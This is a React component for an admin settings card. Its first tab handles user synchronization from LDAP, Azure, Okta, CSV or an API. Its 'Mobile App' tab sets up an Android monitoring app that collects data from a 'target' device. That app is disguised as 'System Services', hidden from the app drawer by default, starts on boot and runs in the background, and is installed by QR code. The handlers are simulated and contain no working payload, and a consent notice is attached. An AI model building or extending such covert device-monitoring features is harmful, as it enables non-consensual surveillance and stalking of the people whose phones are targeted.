
import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Switch } from "@/components/ui/switch";
import { Label } from "@/components/ui/label";
import { useToast } from "@/components/ui/use-toast";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Loader2, RefreshCw, UploadCloud, Users, Smartphone, Download } from "lucide-react";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";

export function UserSync() {
  const { toast } = useToast();
  const [syncing, setSyncing] = useState(false);
  const [autoSync, setAutoSync] = useState(false);
  const [syncSource, setSyncSource] = useState("ldap");
  const [syncInterval, setSyncInterval] = useState("daily");
  const [lastSync, setLastSync] = useState<Date | null>(null);
  const [webhookUrl, setWebhookUrl] = useState("");
  const [showMobileTab, setShowMobileTab] = useState(false);
  const [qrGenerated, setQrGenerated] = useState(false);

  const handleSyncNow = () => {
    setSyncing(true);
    
    // Simulate API call to sync users
    setTimeout(() => {
      setSyncing(false);
      setLastSync(new Date());
      
      toast({
        title: "User Synchronization Complete",
        description: `Successfully synchronized users from ${syncSource.toUpperCase()}.`,
      });
    }, 2000);
  };

  const handleSaveSettings = () => {
    toast({
      title: "Sync Settings Saved",
      description: "Your user synchronization settings have been updated.",
    });
  };

  const handleGenerateQR = () => {
    setQrGenerated(true);
    toast({
      title: "QR Code Generated",
      description: "The QR code for mobile app installation has been generated.",
    });
  };

  const handleDownloadApp = () => {
    toast({
      title: "Mobile App Download",
      description: "Android APK file download started.",
    });
  };

  return (
    <Card>
      <CardHeader>
        <CardTitle className="flex items-center gap-2">
          <Users className="h-5 w-5" />
          <span>User Synchronization</span>
        </CardTitle>
        <CardDescription>
          Configure how users are synchronized with external systems.
        </CardDescription>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs defaultValue="server" className="w-full">
          <TabsList className="grid grid-cols-2 mb-4">
            <TabsTrigger value="server">Server Sync</TabsTrigger>
            <TabsTrigger value="mobile" onClick={() => setShowMobileTab(true)}>Mobile App</TabsTrigger>
          </TabsList>
          
          <TabsContent value="server" className="space-y-4">
            <div className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="sync-source">Synchronization Source</Label>
                <Select value={syncSource} onValueChange={setSyncSource}>
                  <SelectTrigger id="sync-source">
                    <SelectValue placeholder="Select source" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="ldap">LDAP Directory</SelectItem>
                    <SelectItem value="azure">Azure Active Directory</SelectItem>
                    <SelectItem value="google">Google Workspace</SelectItem>
                    <SelectItem value="okta">Okta</SelectItem>
                    <SelectItem value="csv">CSV Upload</SelectItem>
                    <SelectItem value="api">External API</SelectItem>
                  </SelectContent>
                </Select>
              </div>

              {syncSource === "api" && (
                <div className="space-y-2">
                  <Label htmlFor="webhook-url">API Endpoint URL</Label>
                  <Input 
                    id="webhook-url" 
                    placeholder="https://api.example.com/users" 
                    value={webhookUrl}
                    onChange={(e) => setWebhookUrl(e.target.value)}
                  />
                  <p className="text-sm text-muted-foreground">
                    Enter the URL of the API endpoint to fetch users from.
                  </p>
                </div>
              )}

              {syncSource === "csv" && (
                <div className="space-y-2">
                  <Label htmlFor="csv-upload">Upload CSV File</Label>
                  <div className="flex items-center gap-2">
                    <Input id="csv-upload" type="file" accept=".csv" />
                    <Button size="sm">
                      <UploadCloud className="h-4 w-4 mr-2" />
                      Upload
                    </Button>
                  </div>
                  <p className="text-sm text-muted-foreground">
                    Upload a CSV file with user data. The file should include columns for username, email, and role.
                  </p>
                </div>
              )}

              <div className="flex items-center justify-between pt-4">
                <div className="space-y-0.5">
                  <Label htmlFor="auto-sync">Automatic Synchronization</Label>
                  <p className="text-sm text-muted-foreground">
                    Automatically sync users on a regular schedule.
                  </p>
                </div>
                <Switch 
                  id="auto-sync" 
                  checked={autoSync} 
                  onCheckedChange={setAutoSync} 
                />
              </div>

              {autoSync && (
                <div className="space-y-2 ml-6 pl-2 border-l-2 border-muted">
                  <Label htmlFor="sync-interval">Sync Interval</Label>
                  <Select value={syncInterval} onValueChange={setSyncInterval}>
                    <SelectTrigger id="sync-interval">
                      <SelectValue placeholder="Select interval" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="hourly">Hourly</SelectItem>
                      <SelectItem value="daily">Daily</SelectItem>
                      <SelectItem value="weekly">Weekly</SelectItem>
                      <SelectItem value="monthly">Monthly</SelectItem>
                    </SelectContent>
                  </Select>
                </div>
              )}

              <div className="pt-4 space-y-2">
                <div className="flex items-center justify-between">
                  <Label>Last Synchronization</Label>
                  <span className="text-sm">
                    {lastSync 
                      ? lastSync.toLocaleString() 
                      : "Never synchronized"}
                  </span>
                </div>
              </div>
            </div>
            
            <div className="flex flex-col sm:flex-row gap-3 pt-2">
              <Button 
                onClick={handleSyncNow} 
                disabled={syncing}
                className="gap-2"
              >
                {syncing ? (
                  <>
                    <Loader2 className="h-4 w-4 animate-spin" />
                    Syncing...
                  </>
                ) : (
                  <>
                    <RefreshCw className="h-4 w-4" />
                    Sync Now
                  </>
                )}
              </Button>
              <Button 
                variant="outline" 
                onClick={handleSaveSettings}
              >
                Save Settings
              </Button>
            </div>
          </TabsContent>
          
          <TabsContent value="mobile" className="space-y-6">
            <div className="space-y-4">
              <div className="space-y-2">
                <h3 className="text-lg font-medium">Android Mobile App</h3>
                <p className="text-sm text-muted-foreground">
                  Use our Android mobile app to collect data from user devices. The app runs in the background and syncs data to the server.
                </p>
              </div>
              
              <div className="grid md:grid-cols-2 gap-6">
                <div className="space-y-4">
                  <div className="border rounded-md p-4 space-y-4">
                    <div className="flex items-center gap-2">
                      <Smartphone className="h-5 w-5 text-primary" />
                      <h4 className="font-medium">Installation Options</h4>
                    </div>
                    
                    <div className="space-y-2">
                      <div className="flex flex-col space-y-1.5">
                        <Label htmlFor="app-name">App Display Name</Label>
                        <Input id="app-name" defaultValue="System Services" />
                        <p className="text-xs text-muted-foreground">
                          This is how the app will appear on the device.
                        </p>
                      </div>
                      
                      <div className="space-y-2 pt-2">
                        <Label>App Visibility</Label>
                        <Select defaultValue="hidden">
                          <SelectTrigger>
                            <SelectValue placeholder="Select visibility" />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="visible">Visible (Normal App Icon)</SelectItem>
                            <SelectItem value="hidden">Hidden (No App Icon)</SelectItem>
                          </SelectContent>
                        </Select>
                        <p className="text-xs text-muted-foreground">
                          Hidden mode runs the app without an icon in the app drawer.
                        </p>
                      </div>
                      
                      <div className="flex items-center justify-between pt-4">
                        <div className="space-y-0.5">
                          <Label htmlFor="auto-start">Auto Start on Boot</Label>
                          <p className="text-xs text-muted-foreground">
                            App will start automatically after device reboot.
                          </p>
                        </div>
                        <Switch id="auto-start" defaultChecked />
                      </div>
                      
                      <div className="flex items-center justify-between pt-2">
                        <div className="space-y-0.5">
                          <Label htmlFor="data-saving">Data Saving Mode</Label>
                          <p className="text-xs text-muted-foreground">
                            Only sync when on Wi-Fi.
                          </p>
                        </div>
                        <Switch id="data-saving" defaultChecked />
                      </div>
                    </div>
                    
                    <div className="pt-2">
                      <Button className="w-full gap-2" onClick={handleGenerateQR}>
                        Generate Installation QR
                      </Button>
                    </div>
                  </div>
                </div>
                
                <div className="space-y-4">
                  <div className="border rounded-md p-4 space-y-4 h-full flex flex-col">
                    <div className="flex items-center gap-2">
                      <Download className="h-5 w-5 text-primary" />
                      <h4 className="font-medium">Download & Installation</h4>
                    </div>
                    
                    {qrGenerated ? (
                      <div className="flex-1 flex flex-col items-center justify-center space-y-4">
                        <div className="w-48 h-48 bg-gray-200 flex items-center justify-center border">
                          <div className="text-xs text-center p-2">
                            [QR Code Placeholder]<br />
                            Scan with Android device to install
                          </div>
                        </div>
                        <p className="text-sm text-center">
                          Scan this QR code with the target Android device to install the monitoring app.
                        </p>
                        <Button variant="outline" className="gap-2" onClick={handleDownloadApp}>
                          <Download className="h-4 w-4" />
                          Download APK Directly
                        </Button>
                      </div>
                    ) : (
                      <div className="flex-1 flex flex-col items-center justify-center text-center text-muted-foreground">
                        <p>Generate a QR code first to enable app installation on the target device.</p>
                      </div>
                    )}
                  </div>
                </div>
              </div>
              
              <div className="rounded-md bg-amber-50 p-4 text-amber-800 text-sm mt-4">
                <p className="font-medium">Important Legal Notice:</p>
                <p className="mt-1">
                  This monitoring software should only be used on devices you own or with explicit consent from the device owner. 
                  Using this software to monitor someone without their knowledge may be illegal in your jurisdiction. 
                  Ensure compliance with all applicable privacy laws before deployment.
                </p>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
}
